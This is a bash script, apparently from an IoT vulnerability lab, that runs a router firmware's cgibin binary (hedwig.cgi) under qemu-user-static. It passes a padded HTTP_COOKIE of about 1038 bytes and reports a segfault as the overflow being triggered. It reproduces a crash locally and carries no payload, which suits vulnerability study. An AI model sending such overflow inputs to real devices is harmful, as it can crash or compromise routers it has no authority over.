#!/usr/bin/env bash
# run-local.sh - 不需要 docker、不需要 sudo,直接在本机跑 cgibin
#
# 做法:用 apt-get download 取 qemu-user-static 的 deb,dpkg-deb -x 解出
#       qemu-<arch>-static 静态二进制,然后直接运行固件里的 cgibin。
#       避免 docker 拉镜像(很多环境的 registry 会被代理 TLS 拦截)。
#
# 用法:
#   ./tools/run-local.sh                 # 默认 1038 字节 cookie(会崩)
#   LEN=1024 ./tools/run-local.sh        # 不崩的长度
#   ENTRY=/session.cgi ./tools/run-local.sh
set -euo pipefail

cd "$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"

ROOTFS="${ROOTFS:-./squashfs-root}"
ENTRY="${ENTRY:-/hedwig.cgi}"          # argv[0],同时作为 REQUEST_URI 用于分发
LEN="${LEN:-1038}"                     # uid 之后填充的字节数
QDIR="${QDIR:-$HOME/.cache/iot-vulhub/qemu}"
ARCH="${ARCH:-}"

die() { printf '\033[1;31m[x]\033[0m %s\n' "$*" >&2; exit 1; }

[ -d "$ROOTFS" ] || die "没有 rootfs: $ROOTFS(先跑 init_env.sh 或手动解包)"
BIN="$ROOTFS/htdocs/cgibin"
[ -x "$BIN" ] || die "找不到 $BIN"

# ---------- 1. 架构 ----------
if [ -z "$ARCH" ]; then
    info="$(file -b "$BIN" 2>/dev/null || true)"
    case "$info" in
        *MIPS*) case "$info" in *LSB*) ARCH=mipsel ;; *) ARCH=mips ;; esac ;;
        *ARM*)  case "$info" in *LSB*) ARCH=armel  ;; *) ARCH=arm  ;; esac ;;
        *) ARCH=mipsel ;;
    esac
fi
Q="$QDIR/usr/bin/qemu-${ARCH}-static"

# ---------- 2. 准备 qemu ----------
if [ ! -x "$Q" ]; then
    echo "[*] 本地没有 $ARCH 的静态 qemu,尝试 apt-get download(免 sudo)"
    mkdir -p "$QDIR"
    ( cd "$QDIR" && apt-get download qemu-user-static >/dev/null 2>&1 \
        && dpkg-deb -x qemu-user-static_*.deb . )
    [ -x "$Q" ] || die "取 qemu 失败。可手动: cd $QDIR && apt-get download qemu-user-static && dpkg-deb -x qemu-user-static_*.deb ."
fi
echo "[*] qemu: $("$Q" --version | head -1)"

# ---------- 3. 跑 ----------
ulimit -c 0    # 别生成 core 文件
COOKIE="uid=$(printf 'A%.0s' $(seq 1 "$LEN"))"
echo "[*] rootfs=$ROOTFS"
echo "[*] entry=$ENTRY  cookie=${#COOKIE} 字节"

set +e
"$Q" -L "$ROOTFS" \
    -0 "$ENTRY" \
    -E "REQUEST_METHOD=POST" \
    -E "REQUEST_URI=$ENTRY" \
    -E "SCRIPT_NAME=$ENTRY" \
    -E "SERVER_PORT=80" \
    -E "SERVER_NAME=192.168.0.1" \
    -E "CONTENT_TYPE=application/x-www-form-urlencoded" \
    -E "CONTENT_LENGTH=0" \
    -E "HTTP_COOKIE=$COOKIE" \
    "$BIN"
RC=$?
set -e

echo
case "$RC" in
    139) echo "[!] rc=139 SIGSEGV —— 溢出已触发" ;;
    0|255) echo "[*] rc=$RC 正常返回(该长度未触发)" ;;
    *) echo "[?] rc=$RC" ;;
esac
exit "$RC"
